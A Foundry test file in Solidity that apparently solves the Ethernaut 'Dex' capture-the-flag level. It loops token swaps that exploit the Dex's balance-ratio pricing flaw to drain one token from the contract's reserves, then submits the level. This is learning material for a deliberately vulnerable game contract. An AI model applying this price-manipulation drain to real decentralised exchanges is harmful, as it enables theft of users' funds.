// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Dex/DexFactory.sol";
import "../src/levels/Dex/Dex.sol";

contract DexTest is DSTest {
    Ethernaut ethernaut;
    DexFactory dexFactory;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address eoaAddress = address(69);

    function setUp() public {
        ethernaut = new Ethernaut();
        dexFactory = new DexFactory();

        ethernaut.registerLevel(dexFactory);
    }

    function testIsDexCleared() public {
        vm.startPrank(eoaAddress);

        address instanceAddress = ethernaut.createLevelInstance(dexFactory);
        Dex dex = Dex(instanceAddress);

        address[2] memory tokens = [dex.token1(), dex.token2()];
        dex.approve(instanceAddress, 500);

        uint256[2] memory hackBalances;
        uint256[2] memory dexBalances;
        uint256 fromIndex = 0;
        uint256 toIndex = 1;

        while (true) {
            hackBalances = [
                SwappableToken(tokens[fromIndex]).balanceOf(eoaAddress),
                SwappableToken(tokens[toIndex]).balanceOf(eoaAddress)
            ];

            dexBalances = [
                SwappableToken(tokens[fromIndex]).balanceOf(address(dex)),
                SwappableToken(tokens[toIndex]).balanceOf(address(dex))
            ];

            uint256 swapPrice = dex.getSwapPrice(
                tokens[fromIndex],
                tokens[toIndex],
                hackBalances[0]
            );
            if (swapPrice > dexBalances[1]) {
                dex.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
                break;
            } else {
                dex.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
            }
            // reverse indexes
            fromIndex = 1 - fromIndex;
            toIndex = 1 - toIndex;
        }

        assertTrue(ethernaut.submitLevelInstance(payable(instanceAddress)));

        vm.stopPrank();
    }
}
